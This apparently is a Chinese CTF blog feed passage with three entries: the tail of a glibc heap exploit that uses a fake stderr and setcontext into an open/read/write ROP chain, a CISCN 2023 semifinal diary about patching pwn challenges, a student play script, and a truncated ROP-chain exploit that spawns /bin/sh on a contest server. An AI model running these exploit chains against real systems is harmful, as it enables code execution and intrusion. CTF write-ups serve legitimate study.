p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#attack point_guart</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>)</span><br><span class="line">payload = p64(fixed_heap_fdbk)*<span class="number">2</span> + p64(heap_base+<span class="number">0x880</span>) + p64(point_guard-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#largbin fix</span></span><br><span class="line">payload = p64(heap_base+<span class="number">0x1120</span>)+p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x1120</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">32</span>,payload)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x1f30c0</span>)+p64(heap_base+<span class="number">0x880</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">32</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#prepare assert</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x420</span>,cyclic(<span class="number">0x418</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line">gadget = libc_base + <span class="number">0x0000000000146020</span></span><br><span class="line"><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002d446</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000446c0</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002daa2</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000037c0a</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000883b6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake stderr</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x78</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x10</span>) <span class="comment">#chunk 0-&gt;rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ROL(gadget^(heap_base+<span class="number">0x1120</span>),<span class="number">0x11</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0xe8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdi-&gt;rdx</span></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>)<span class="comment">#rdx-&gt;chunk 5</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#rdx-&gt;setcontext</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(setcontex61)<span class="comment">#call [rdx+0x20]</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1120</span>+<span class="number">0x10</span>+<span class="number">0x18</span>)<span class="comment">#rdi-&gt;./flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x430</span>+<span class="number">0x10</span>)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0xb0</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"><span class="comment">#orw chain</span></span><br><span class="line">payload = p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">17</span>*<span class="number">8</span>,payload)</span><br><span class="line">sendit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger assert</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x500</span>)</span><br><span class="line">sendit()</span><br><span class="line">            r=p.recvuntil(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">flag = r+p.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">log.success(flag)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-2023半决赛游记</title>
      <link href="/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/"/>
      <url>/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="6-10"><a href="#6-10" class="headerlink" title="6.10"></a>6.10</h1><p>飞往云南</p><p>东航的空乘小姐姐还给我送来一个生日蛋糕，泪目，还挺好吃</p><p>云大的赛场多少有点寒酸了，大门比我寝室门大不了多少</p><p>没网线转接器，去外面买。老板说不开发票90一个，开发票110</p><p>买了两个，这时西华的队伍也来买转接器。我们眼睁睁看着老板坐地起价，不开发票110，开发票130</p><p>晚上吃了红伞伞、白伞伞、黄伞伞，心满意足地等着小人教我打pwn</p><p>回去把unlink看完，小人还没出现，大抵是鸽了</p><h1 id="6-11"><a href="#6-11" class="headerlink" title="6.11"></a>6.11</h1><p>本来想的是Beethoven负责补补补，我负责杀杀杀，结果第一波题就给了我小小的震撼</p><p>一道是堆题，另一道也是堆题</p><p>我artist还没逆完，别人CNSS已经把洞补好了，急死我了</p><hr><h2 id="artist-patch"><a href="#artist-patch" class="headerlink" title="artist_patch"></a>artist_patch</h2><p>整道题的功能大概是，选项1分配一个80h的chunk，并读取不超过80h的输入；选项2将指定chunk内容输出并free掉，free之前可以更改chunk开头的10h字节；选项3是将某个chunk开始的第任意个字节置为NULL</p><p>整个程序中没有发现溢出，但是似乎可以利用3的功能实现对chunk header的改写，然后打一个unlink</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194620801.png" alt="image-20230612194620801"></p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612194711287.png" alt="image-20230612194711287"></p><p>但是因为开了Full RELRO，无法进行got hijacking，俺横竖想了半天也找不到劫持控制流的办法，但是patch还是可以做到的，只需要让更改的byte不超过chunk范围就可以了</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195202307.png" alt="image-20230612195202307"></p><p>于是我将my_read中canary部分改写成rax与80h的比较跳转语句，成功patch</p><h2 id="over-patch"><a href="#over-patch" class="headerlink" title="over_patch"></a>over_patch</h2><p>本场唯一一道非堆题，怎么办怎么办我还是不会</p><p>逻辑很简单，有四个选项，前三个选项都是读入一个小于等于4的数，进行一通很猛的计算，然后将某个地址的内容修改</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612195909839.png" alt="image-20230612195909839"></p><p>选项4是将程序开头输入的名称再次输出。实现方法是：程序开始时把puts的plt地址放入某个地址，然后再调用这个地址。很显然，这里可以更改这个地址的内容，轻松地system(“&#x2F;bin&#x2F;sh”)</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200128649.png" alt="image-20230612200128649"></p><p>所以patch也非常简单，只需要把调用地址改成直接调用函数就行了</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612200535096.png" alt="image-20230612200535096"></p><p>没想到这个patch折磨了我几个小时</p><p>首先，我的patch流程非常的原始，因为linux本找不到合适的ida，win本搞忘装wsl，我都是在win本上用ida进行patch，再用u盘拷到linux本上验证。这样操作u盘和接口都挺累的，Beethoven和Sparkl的u盘就是这样被玩得识别不了（</p><p>然后我发现，不管我怎么改，最后运行的时候都会segment fault。我以为是我的问题，于是尝试了各种方法：直接call puts、直接call my_write、把puts的plt再覆写到原位置再call（这个操作很长，需要jump到en_frame段），甚至我还试过在每次更改后都调用一遍初始化函数、把初始化函数放进while循环这些离谱操作，结果都是悲伤的segment fault。</p><p>我怀着沉痛的心情决定用gdb跑一遍，看看问题在哪里。于是我一路走下去，走到选项四，看到一行熟悉的汇编：jmp 0x……</p><p>我超，这不是我几轮之前的版本吗！我以为是我操作失误没有拷贝上，于是重新应用了一遍patch，重新拷过来，结果依旧能看到熟悉的jmp</p><p>此前，我一直是个坚定的无神论者</p><p>我用ida又应用了一份patch，然后用ida打开，果不其然，还是有jmp</p><p>我的ida烂了！</p><p>（严格来说，U盘也是烂的，后面我发现有时改动U盘文件，拔插后竟然可以恢复如初）</p><p>我抢来Beethoven的电脑，改了两遍就好了，call my_write，没有segment fault</p><p>喜闻乐见的是，我们交上去之后，结果是这样的：</p><p><img src="/../img/ciscn2023%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%B8%B8%E8%AE%B0.assets/image-20230612203259477.png" alt="image-20230612203259477"></p><p>乐，折磨了我两个多小时的洞，改半天连关键点都没改对</p><p>我盯着代码看了半天，横竖没看到别的洞。</p><p>直到比赛结束前二十分钟，我还是不相信，怀疑是打包的问题，于是又打了一遍。准备再次提交时，我看到提交要求：patch脚本应命名为update.sh，我一直写的是over.sh</p><p>哄堂大笑了</p><p>樂</p><h2 id="over-getflag"><a href="#over-getflag" class="headerlink" title="over_getflag"></a>over_getflag</h2><p>没做出来，解法是shino教的</p><p>我一直以为那几个修改是什么高深的算法，一度唆使密码学大师Beethoven进行破解。他发现v5并没有用上，然后我们止步于此。事实上，整个算法都是障眼法，真正有用的部分只有：将<code> *((_DWORD *)&amp;qword_4060 + v3 + 12)</code>的内容减去读入的<code>my_read</code>，因为v3可以为负，可以直接修改存储puts_plt处的内容</p><p>实际上我最大的问题是把<code>qword_4060 += v4</code>这句误以为是地址会加上v4，于是认为v4会影响最后修改的地址</p><p>所谓逆向不规范，打pwn两行泪</p><hr><p>走的时候听见一个指导老师在跟队员说：你之前的作业又没有认真做吧，你看这次出原题了吧</p><h1 id="6-12"><a href="#6-12" class="headerlink" title="6.12"></a>6.12</h1><p>计划：上午逛云大</p><p>现实：11：30被电话叫醒</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>不会堆，我好菜（你以为你菜只是因为不会堆吗）</p><p>为了打patch补了一些汇编知识，对于一个只会f5的pwn手已经很难得了</p><p>学点逆向吧</p><p>CNSS好强</p><p>什么时候才能有钱换电脑啊</p><p>云南美女真多</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> awd </tag>
            
            <tag> 摸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湍流</title>
      <link href="/%E6%B9%8D%E6%B5%81/"/>
      <url>/%E6%B9%8D%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<blockquote><p>大一学生抽象心理课作品</p></blockquote><h1 id="第一幕，外景：河水边"><a href="#第一幕，外景：河水边" class="headerlink" title="第一幕，外景：河水边"></a>第一幕，外景：河水边</h1><p>人物：程晓靛、程晓靛（卷）、程晓靛（摆）、河神、学神。</p><p>（程晓靛上）</p><p>程（独白）：程晓靛啊程晓靛，你追寻18年的目标，在高考完的夜晚竟然凭空消失了。你以为你会在新的校园找到新的方向，呵，这三个月只让你变得更加迷茫。</p><p>卷：各式各样的人，各式各样的湍流。</p><p>摆：你只是一片在他们之间晕头转向的落叶。</p><p>卷：忙碌却不知道所做为何。</p><p>摆（戏谑）：好像一条狗啊。</p><p>（程摆摆头，烦躁地走到河边的围栏处，靠了上去）</p><p>（河神身着西装，在他身后凭空出现）</p><p>河：别跳啊小伙子，有事都可以向领导反映。</p><p>程：谁要跳了？我在观察这只黑天鹅的形体美。</p><p>河：跟你开玩笑的，我是河神，当然知道你在想什么。</p><p>程：没见过河神穿西装的。</p><p>河：这不提升品牌形象嘛。</p><p>（说着走向河边，面朝大河，背身侧对着程晓靛）</p><p>河：我在这里工作了六十年，见过太多你这样的学生。（突然感慨）可能迷茫才是青春的常态，步伐坚定都是意料之外。</p><p>摆（窃窃私语）：他谁啊？</p><p>卷：卖保险的让进学校了？</p><p>河（清清嗓子装作没听见）：我们决定给这样的学生一个机会，一个让他们找到自己方向的机会。（转身严肃地看向程）如果你能按别人的人生轨迹生活，你最想成为谁？</p><p>程：啊（迟疑）成为别人？</p><p>河：别误会，你还是你，只是你的目标、生活轨迹会随之改变。</p><p>摆：听起来不错，省得在迷茫中浪费四年。</p><p>卷（思索）：咱学校今年不是有个保研清华的学长吗，圈里都叫他神仙。</p><p>（开始插入学神的片段，卷为旁白）</p><p>卷：据说他考试从来没有低过99分（内景，宿舍，学神在学习，有人递来一张100试卷，学神随手往废纸篓一扔，镜头切到废纸篓，里面全是满分试卷）</p><p>卷：竞赛大奖拿到手抽筋（内景，自习室，学神拿着一张奖状，手开始抽筋）</p><p>卷：于是顺理成章地成为了保研清华的最佳人选（学长在清华门前拍照，此处的清华门可以p上去，或者在大屏幕上投一个清华门的背景）</p><p>（幻想时间结束，回到原来的场景）</p><p>程（点点头）：我想成为他。</p><p>河（微笑）：那你闭上眼睛。</p><p>程闭眼，河掏出一粒红色药丸，粗鲁地塞进程晓靛嘴里，程试图挣扎。</p><p>画面一黑。</p><p>河的声音：但是，古尔丹，代价是什么呢？</p><h1 id="第二幕，内景：自习室"><a href="#第二幕，内景：自习室" class="headerlink" title="第二幕，内景：自习室"></a>第二幕，内景：自习室</h1><p>人物：程晓靛，卷，摆，奚彩（女朋友），室友老王</p><p>程晓靛趴在桌子上睡觉，突然惊醒</p><p>程：我是谁，我在哪，我在干什么？</p><p>卷：你是卷王，你在自习室，你在为中华之崛起而读书。</p><p>摆：差不多得了，这才六点过，你偏要跑来背什么单词，做给谁看呢。</p><p>程突然惊讶地发现眼前有一本翻开的单词书。</p><p>摆：让我看看带学霸背多少了……（抢过单词书）（郑重其事地饱含感情地大声朗读）A，Abandon，放弃。</p><p>卷（愤怒地）：哎呦你干嘛（抢过单词书给程），人的转变总是要点时间适应。像你这样急功近利，什么事也做不成。（转头看向程，温柔而坚定地）我们一起，为了梦想奋斗吧。</p><p>程点点头，眼中有希望的光。</p><h2 id="2-1-内景，自习室"><a href="#2-1-内景，自习室" class="headerlink" title="2-1 内景，自习室"></a>2-1 内景，自习室</h2><p>镜头正对学习中的程，倍速播放程学习的一天，光线由暗到明再到暗，桌子上堆积的书一堆慢慢减少，另一堆慢慢增多，他的身后人来人往。程一直埋头苦学。</p><p>晚上，奚小彩静静来到他身边，拍了拍他</p><p>程惊：奚小彩？</p><p>奚小彩微笑着示意和她一起出去。</p><p>程无奈地摇了摇头，指了指堆积的书籍。</p><p>奚小彩苦笑。</p><h2 id="2-2-外景，体育场边的道路上"><a href="#2-2-外景，体育场边的道路上" class="headerlink" title="2-2 外景，体育场边的道路上"></a>2-2 外景，体育场边的道路上</h2><p>程举着手机慢跑，镜头迎着程，保持程在画面中心。</p><p>旁边走来一个拿着篮球的兄弟招呼他打篮球，程摆摆手，举起手中的乐健示意</p><p>旁边走来一个拿着乒乓球拍的兄弟招呼他打乒乓球，程摆摆手，举起手中的乐健示意</p><p>旁边走来一个拿着羽毛球拍的兄弟招呼他打羽毛球，程摆摆手，举起手中的乐健示意</p><h2 id="2-3-外景，夜晚，长椅上"><a href="#2-3-外景，夜晚，长椅上" class="headerlink" title="2-3 外景，夜晚，长椅上"></a>2-3 外景，夜晚，长椅上</h2><p>程拿着课本满怀感情地大声朗读：where there is a will，there is a way</p><p>突然手机响了，奚彩发来一条微信：我不想耽误你   就这样吧。</p><p>程看向天空，黑暗中看不清他的脸。</p><h2 id="2-4-内景，宿舍里，清晨"><a href="#2-4-内景，宿舍里，清晨" class="headerlink" title="2-4 内景，宿舍里，清晨"></a>2-4 内景，宿舍里，清晨</h2><p>镜头落在日历上，圈出了保研结果公布的日期，正是今天。</p><p>程醒来，发现手机邮箱里收到了清华大学的offer。</p><p>他惊喜地欢呼，他跃下床：芜湖！兄弟们！我要上清华了！</p><p>可是没有人回应</p><p>镜头扫过寝室，两个室友都不在，剩下的一个戴着耳机在打游戏。</p><p>程拍拍室友的肩，室友摘下耳机回头，然后回头继续打游戏，程问：老王，他们两个人呢？这么早就不见了？</p><p>老王头也不回：你忘了？今天是老李生日，老张带着他女朋友一起去市里给他庆生了。</p><p>程：那你怎么没去？</p><p>老王：这不刚拿到菊花厂offer，待会下午要去那边对接一下工作，分身乏术啊。</p><p>程目瞪口呆。</p><h1 id="第三幕-外景-河边"><a href="#第三幕-外景-河边" class="headerlink" title="第三幕 外景 河边"></a>第三幕 外景 河边</h1><p>人物：程晓靛，卷，摆，河神</p><p>河神坐在一边，程晓靛在一边踱步</p><p>程：事情就是这样，经过四年的奋斗，我终于达到了自己的梦想。可是站在终点回望这四年的旅途，我好像错过了太多风景，失去了太多的旅伴。</p><p>河：人生就是这样嘛，得失参半，再寻常不过。</p><p>程（愤怒）：但这不是我想要的！这不该是我的大学生活！</p><p>河无奈地摇摇头，从口袋里摸出红蓝两粒药丸：我现在给你一次重新选择的机会，红色药丸能让你重新选择你要成为的人，蓝色药丸会将你过去的四年化为云烟，赤手空拳地重新开始。</p><p>摆：你看那个老王，我就没见他上过几回课，每天不是出去花天酒地就是在寝室打游戏，最后还不是顺利拿到了菊花厂的offer？我看就选他吧。</p><p>卷：我不相信有这样的好事…</p><p>话音未落，程上前已经抓走了红色药丸，一口吞下。</p><p>画面一黑。</p><h1 id="第四幕-内景-宿舍"><a href="#第四幕-内景-宿舍" class="headerlink" title="第四幕 内景 宿舍"></a>第四幕 内景 宿舍</h1><p>人物：程 卷 摆</p><p>程在宿舍打游戏，打出一个漂亮的五杀</p><p>摆（心满意足）：我说咱这几年，不受高数的折磨，脑细胞的存活率真是大幅提升了啊。</p><p>卷（不屑）：是啊，不去围猎猛犸象真是埋没人才了。</p><p>程：你别管，至少我这几年过的像神仙。</p><p>卷（阴阳怪气）：神仙马上就要脸朝下落地咯。</p><p>摆：别，咱的offer已经在路上了。</p><p>卷：你也不看今天几号了？您这offer是M87星云走申通快递寄来的吧</p><p>程看日历，惊了</p><p>摆：咋办</p><p>程：找那老头理论去！</p><h1 id="第五幕-外景-河边"><a href="#第五幕-外景-河边" class="headerlink" title="第五幕 外景 河边"></a>第五幕 外景 河边</h1><p>人物： 程 卷 摆 河</p><p>程到河边破口大骂：糟老头子！给我滚出来！我的offer呢！</p><p>河神在身后出现，邪魅一笑：你爹又不是菊花厂老板</p><p>程凝住。</p><p>随后感到愤怒，此处应有白金之星处刑曲响起，程转身面向河神，身后出现摆和卷。</p><p>摆，卷：欧拉！（一拳打倒河神）</p><p>程：朋友们，我明白了，（走近河神倒下的身体），没有人可以帮我决定我的生命，也没有人可以为我失败的选择负责（同时单膝蹲下，在河神身上摸索，找到蓝色药丸），我想过好我自己的人生（两根手指举起药丸，对着太阳的方向）</p><p>卷：握紧每一分钟的生命</p><p>摆：准备迎接每一个当下的美好</p><p>程：对自己的一切行为负责</p><p>三人：无怨无悔。</p><p>程吞下药丸，画面一黑。</p><h1 id="第六幕"><a href="#第六幕" class="headerlink" title="第六幕"></a>第六幕</h1><p>与画面同步的旁白：“那时候我突然意识到，每条溪流都有自己的轨迹，细小的不必强求气势磅礴，高亢的不必羡慕宛转轻盈。我本来就不必成为任何人，我只要做，当下最好的自己。</p><h2 id="6-1-程晓靛在自习室和同学热火朝天地讨论数学问题"><a href="#6-1-程晓靛在自习室和同学热火朝天地讨论数学问题" class="headerlink" title="6-1 程晓靛在自习室和同学热火朝天地讨论数学问题"></a>6-1 程晓靛在自习室和同学热火朝天地讨论数学问题</h2><h2 id="6-2-程晓靛和奚小彩在夜晚的灯光下漫步，走到之前（2-3）程晓靛分手的位置时，两人突然相视一笑"><a href="#6-2-程晓靛和奚小彩在夜晚的灯光下漫步，走到之前（2-3）程晓靛分手的位置时，两人突然相视一笑" class="headerlink" title="6-2 程晓靛和奚小彩在夜晚的灯光下漫步，走到之前（2-3）程晓靛分手的位置时，两人突然相视一笑"></a>6-2 程晓靛和奚小彩在夜晚的灯光下漫步，走到之前（2-3）程晓靛分手的位置时，两人突然相视一笑</h2><h2 id="6-3-程晓靛在足球场上奔跑，一个帅气的射门，球进了，奚小彩欢呼。"><a href="#6-3-程晓靛在足球场上奔跑，一个帅气的射门，球进了，奚小彩欢呼。" class="headerlink" title="6-3 程晓靛在足球场上奔跑，一个帅气的射门，球进了，奚小彩欢呼。"></a>6-3 程晓靛在足球场上奔跑，一个帅气的射门，球进了，奚小彩欢呼。</h2>]]></content>
      
      
      <categories>
          
          <category> literature </category>
          
      </categories>
      
      
        <tags>
            
            <tag> literature </tag>
            
            <tag> drama </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2023pwn宝宝题解</title>
      <link href="/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/"/>
      <url>/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>坐牢了，只会做baby题</p></blockquote><h1 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a>shaokao</h1><p>整型下溢，然后有个栈溢出，直接用ROPgadget生成ropchain</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173718539.png" alt="image-20230528173718539"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.56.251.120&quot;</span></span><br><span class="line">port = <span class="number">36293</span></span><br><span class="line"><span class="comment">#pl = process(&quot;./shaokao&quot;)</span></span><br><span class="line">pl = remote(host,  port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;-1145144&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += 